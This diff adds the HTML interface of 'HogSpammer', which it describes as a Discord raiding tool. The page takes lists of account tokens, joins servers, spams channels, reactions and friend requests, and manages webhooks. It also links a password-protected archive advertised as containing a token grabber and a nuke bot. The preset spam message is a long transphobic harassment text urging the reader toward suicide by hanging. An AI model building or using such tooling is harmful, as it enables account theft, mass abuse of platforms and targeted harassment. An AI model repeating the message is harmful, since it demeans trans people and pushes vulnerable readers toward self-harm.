@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<head>
+<link rel="stylesheet" href="css/style.css">
+</head>
+<!--
+HogSpammer v1.4
+████████╗██╗░░██╗███████╗  ░██████╗███████╗░██╗░░░░░░░██╗███████╗██████╗░  ██████╗░██╗░██████╗░
+╚══██╔══╝██║░░██║██╔════╝  ██╔════╝██╔════╝░██║░░██╗░░██║██╔════╝██╔══██╗  ██╔══██╗██║██╔════╝░
+░░░██║░░░███████║█████╗░░  ╚█████╗░█████╗░░░╚██╗████╗██╔╝█████╗░░██████╔╝  ██████╔╝██║██║░░██╗░
+░░░██║░░░██╔══██║██╔══╝░░  ░╚═══██╗██╔══╝░░░░████╔═████║░██╔══╝░░██╔══██╗  ██╔═══╝░██║██║░░╚██╗
+░░░██║░░░██║░░██║███████╗  ██████╔╝███████╗░░╚██╔╝░╚██╔╝░███████╗██║░░██║  ██║░░░░░██║╚██████╔╝
+░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░╚═════╝░
+Created by the sewer pig.
+-->
+  <body>
+  
+  <div class="content">
+  <title>HogSpammer v1.4</title>
+  <link rel="icon" href="favicon.ico">
+<meta property="og:title" content="HogSpammer, a discord raiding tool written in HTML and JavaScript.">
+<meta property="og:type" content="website">
+<meta property="og:image" content="https://raw.githubusercontent.com/thesewerpig/HogSpammer/master/images/thesewerpig.png">
+<meta property="og:url" content="https://thesewerpig.github.io">
+<meta property="og:description" content="A discord raiding tool written in HTML and JavaScript. Created by the sewer pig.">
+  <h1>HogSpammer v1.4</h1>
+  <h1>Created by the sewer pig.</h1>
+  <script src="js/HogSpammer.js"></script>
+  <img src="images/thesewerpig.png" width="450" height="283"></img>
+  <br><br>
+  <a href="https://thesewerpig.github.io/" target="_blank">Discord Server</a> 
+  <br><br>
+  <a href="https://youtube.com/c/thesewerpig" target="_blank">YouTube Channel</a> 
+  <br><br>
+<a href="files/v1.5.zip" target="_blank">Token grabber, nuke bot, and other cool tools.</a> 
+<br> <a>Archive Password: thesewerpig</a> 
+  <br><br>
+  <div class="main" p style="width: 810x;" id="ChooseTokens">
+    <script>document.getElementById("ChooseTokens").style.border = "2px solid silver"</script>
+    <h2>Choose Tokens</h2>
+    <input type="file" class="filecustom" accept=".txt" id="TokenFile" p style="font-size: 18px">
+    <br><br><textarea name ="TokensList" rows ="5" cols ="88" id ="TokenList" p style="font-family:verdana;">None!</textarea>
+    <br><br>
+  </div>
+  <script src="js/TokenInput.js"></script>
+  <br><br>
+  <div class ="main" p style="width: 436px; margin:0 auto;" id="ServersOptions">
+    <script>document.getElementById("ServersOptions").style.border = "2px solid silver"</script>
+    <h2>Server Options</h2>
+    <b p style="font-size: 18px">discord.gg/</b><input type="text" id="ServerInv" name="ServerInvite" p style="width: 125px;"> <button class="buttonsmall" onclick="joinInvite(`${document.getElementById('ServerInv').value}`);">Join</button>
+    <br>
+    <br>
+    <b p style="font-size: 18px">Server ID: </b><input type="text" id="ServerID" name="ServerIDnum" p style="width: 190px;"> <button class="buttonsmall" onclick="leaveFromID(`${document.getElementById('ServerID').value}`);">Leave</button>
+  <br>
+  <h2>Change Nickname</h2>
+  <b p style="font-size: 18px">Server ID: </b><input type="text" id="ServerIDNick" name="ServerIDNickNum" p style="width: 190px; font-family:verdana; font-size:16px"><br><br>
+  <b p style="font-size: 18px">Nickname:
+  <input type="text" id="ChangeNick" name="NickNametxt" maxlength ="32" p style="width: 190px; font-family:verdana; font-size:16px">
+  <br><button class="buttonsmall" onclick="setNickname(`${document.getElementById('ServerIDNick').value}`, `${document.getElementById('ChangeNick').value}`);">Change</button><br><br>
+
+  </div>
+  <br><br>
+  <div id="Spam">
+    <script>document.getElementById("Spam").style.border = "2px solid silver"</script>
+  <h2>Token Options</h2><br>
+  <b p style="font-size: 22px">Spam a Channel</b>
+  <br><br><a p style="font-size: 18px;">Channel ID: </a><input type="text" id="ChannelID" name="ID" p style="font-family:verdana">
+  <br><br><a p style="font-size: 18px;">Interval (ms): </a><input type="text" id="SpamInterval" name="SpamInt" p style="font-family:verdana; width: 70px;">
+<script>document.getElementById('SpamInterval').value=1000;</script>
+  <br><br><b p style="font-size: 18px;">Message: </b>
+  <br><textarea name ="Message" rows ="20" cols ="88" id ="Message" minlength ="1" maxlength="2000" p style="font-family:verdana">@everyone SEWER PIG DEATH SQUADS HAVE TAKEN OVER THIS SERVER, FEAR THE HOG https://cdn.discordapp.com/attachments/780580957219455016/782342387501367306/VN20201128_222711.mp4 https://cdn.discordapp.com/attachments/782006630371950592/782061090578104328/poggerpogs.mp4 https://cdn.discordapp.com/attachments/450519016155381770/649328740702224428/santa.mp4 https://cdn.discordapp.com/attachments/759227111717470282/759893282515189781/Godspeed_-_Copy.mp4 https://cdn.discordapp.com/attachments/779556068455612418/799206911157338153/RPReplay_Final1610608651.mov You will never be a real woman. You have no womb, you have no ovaries, you have no eggs. You are a homosexual man twisted by drugs and surgery into a crude mockery of nature’s perfection. All the “validation” you get is two-faced and half-hearted. Behind your back people mock you. Your parents are disgusted and ashamed of you, your “friends” laugh at your ghoulish appearance behind closed doors. Men are utterly repulsed by you. Thousands of years of evolution have allowed men to sniff out frauds with incredible efficiency. Even trannies who “pass” look uncanny and unnatural to a man. Your bone structure is a dead giveaway. Even if you manage to get a drunk guy home with you, he’ll leave you the second he gets a whiff of your diseased, infected axe wound. You will never be happy. You wrench out a fake smile every single morning and tell yourself it’s going to be ok, but deep inside you feel the depression creeping up like a weed, ready to crush you under the unbearable weight. Eventually it’ll be too much to bear, you’ll buy a rope, tie a noose, put it around your neck, and plunge into the cold abyss. Your parents will find you, heartbroken but relieved that they no longer have to live with the unbearable shame and disappointment. They’ll bury you with a headstone marked with your birth name, and every passerby for the rest of eternity will know a man is buried there. Your parents will bury you using your real name.</textarea>
+  <br><button class="button" id="AttackBtn" button onclick="CheckBtn(`${document.getElementById('ChannelID').value}`, `${document.getElementById('Message').value}`,`${document.getElementById('SpamInterval').value}`);">Attack!</button>
+<br><br><br>
+<b p style="font-size: 22px;">React to a Message</b><br><br>
+<b p style="font-size: 18px;">Channel ID: </b><input type="text" id="ChannelIDReact" name="IDReact" p style="font-family:verdana">
+<br><br><b p style="font-size: 18px;">Message ID: </b><input type="text" id="MessageIDReact" name="MIDReact" p style="font-family:verdana">
+<br><br><b p style="font-size: 18px;">Emoji: </b><input type="text" id="EmojiReact" name="EIDReact" p style="font-family:verdana">
+<br><br>
+<form>
+  <input type="radio" id="AddReaction" name="Reaction" value="ReactToMessage" checked>
+  <label for="cReactToMessage">Add Reaction</label>
+  <br><br>
+  <input type="radio" id="RemoveReaction" name="Reaction" value="RemoveReactionFromMessage">
+  <label for="RemoveReactionFromMessage">Remove Reaction</label>
+</form> 
+<br><button class="button" id="ReactBtn" button onclick="reactToMsg(`${document.getElementById('ChannelIDReact').value}`, `${document.getElementById('MessageIDReact').value}`,`${document.getElementById('EmojiReact').value}`);">Start</button>
+<br><br><br><br>
+<b p style="font-size: 22px;">React with a Custom Emoji</b><br><br>
+<b>Channel ID: </b><input type="text" id="ChannelIDcReact" name="IDcReact" p style="font-family:verdana">
+<br><br><b>Message ID: </b><input type="text" id="MessageIDcReact" name="MIDcReact" p style="font-family:verdana">
+<br><br><b>Emoji Name: </b><input type="text" id="CustomEmojiReact" name="CEIDReact" p style="font-family:verdana">
+<br><br><b>Emoji ID: </b><input type="text" id="CustomEmojiID" name="CEIDReact" p style="font-family:verdana">
+<br><br>
+<form>
+  <input type="radio" id="AddCReaction" name="cReaction" value="cReactToMessage" checked>
+  <label for="cReactToMessage">Add Reaction</label>
+  <br><br>
+  <input type="radio" id="RemoveCReaction" name="cReaction" value="RemovecReactionFromMessage">
+  <label for="RemovecReactionFromMessage">Remove Reaction</label>
+</form> 
+<br><button class="button" id="ReactCstmBtn" button onclick="reactToCustomMsg(`${document.getElementById('ChannelIDcReact').value}`, `${document.getElementById('MessageIDcReact').value}`,`${document.getElementById('CustomEmojiReact').value}`,`${document.getElementById('CustomEmojiID').value}`);">Start</button>
+<br><br><br><br>
+<b p style="font-size: 22px;">Change Status</b><br><br>
+<b p style="font-size: 18px;">Status: </b>
+<select name="DefaultStatus" id="DefaultStatuses">
+  <option value="online">Online</option>
+  <option value="idle">Idle</option>
+  <option value="dnd">Do not Disturb</option>
+  <option value="invisible">Invisible</option>
+</select>
+<br><button class="buttonsmall" id="dStatBtn" button onclick="setDefaultStatus(`${document.getElementById('DefaultStatuses').value}`, `${document.getElementById('CustomStatus').value}`,`${document.getElementById('EmojiStat').value}`);">Change</button>
+<br><br><b p style="font-size: 18px;">Custom Status: </b><br><input type="text" id="CustomStatus" name="CustomStat" p style="font-family:verdana">
+<br><b p style="font-size: 18px;">Emoji: </b><input type="text" id="EmojiStat" name="EStat" p style="font-family:verdana">
+<button class="buttonsmall" id="cStatBtn" button onclick="setCustomStatus(`${document.getElementById('CustomStatus').value}`, `${document.getElementById('EmojiStat').value}`,`${document.getElementById('EmojiStat').value}`);">Start</button>
+<br><br><br><br>
+<b p style="font-size: 22px;">Spam Friend Requests</b><br>
+<br><b p style="font-size: 18px;">User ID: </b><input type="text" id="FriendID" name="FriendRequestID" p style="font-family:verdana">
+<br><br>
+<form>
+  <input type="radio" id="SendFriendRequest" name="friendreq" value="SendFReq" checked>
+  <label for="SendFReq">Send Request</label>
+  <br><br>
+  <input type="radio" id="DeleteFriendRequest" name="friendreq" value="RemoveFReq">
+  <label for="RemoveFReq">Remove Request</label>
+</form> 
+<br>
+<button class="buttonsmall" id="FriendBtn" button onclick="friendSpam(`${document.getElementById('FriendID').value}`);">Start</button>
+<br><br>
+<br><br>
+<h2 p style="font-size: 22px;">Profile Picture Changer</h2>
+<a>(Discord will prevent you from doing this frequently)</a>
+<br><br>
+<input type="file" class ="filecustom" accept="image/png, image/jpeg" name="profileInput" id="ProfilePicture">
+<br><br>
+<div class="image-preview" id="imagePreview">
+  <img src="" alt="Image Preview" class="image-preview__image">
+  <span class ="image-preview__default-text">No image chosen!</span>
+</div>
+<input type="text" id="PFPdataURI" class="hiddentext">
+<br>
+<button class="buttonsmall" id="PfPBtn" button onclick="changeProfilePictures(`${document.getElementById('PFPdataURI').value}`);">Start</button>
+<script src="js/ImageHander.js"></script>
+<br><br>
+</div>
+
+</div>
+<br><br>
+<div class ="main" p style="width: 660px; margin:0 auto;" id="HookOptions">
+  <script>document.getElementById("HookOptions").style.border = "2px solid silver"</script>
+  <h2>Webhook Options</h2>
+  <b p style="font-size:18px;">Author: </b><input type="text" id="HookAuthor" name="WebhookAuthor" maxlength ="256" p style="width: 250px; font-family:verdana; font-size:12px">
+  <br><br>
+  <b p style="font-size:18px;">Avatar URL: </b><input type="text" id="HookAvatar" name="WebhookAvatar" p style="width: 375px; font-family:verdana; font-size:12px">
+  <br><br>
+  <b p style="font-size:18px;">Message: </b><br><textarea style="resize: none;" type="text" id="HookMsg" rows="5" cols="75" name="WebhookMessage" maxlength ="2000" p style="width: 250px; font-family:verdana; font-size:12px"></textarea>
+  <br><br>
+  <b p style="font-size:18px;">Webhook URL:</b>
+  <br>
+  <input type="text" id="HookURL" name="WebhookURL" p style="width: 500px; font-family:verdana; font-size:12px">  <button class="buttonsmall" onclick="sendWebhook(`${document.getElementById('HookURL').value}`, `${document.getElementById('HookAuthor').value}`,`${document.getElementById('HookAvatar').value}`,`${document.getElementById('HookMsg').value}`);">Send</button><br>
+  <br><br>
+  <b>Webhook URL:</b>
+  <br>
+  <input type="text" id="DelHookURL" name="WebhookDelURL" p style="width: 500px; font-family:verdana; font-size:12px"> <button class="buttonsmall" onclick="deleteWebhook(`${document.getElementById('DelHookURL').value}`);"> Delete</button>
+<br><br>
+</div>
+
+  </body>
+  </div>
+  </body>
+</html>
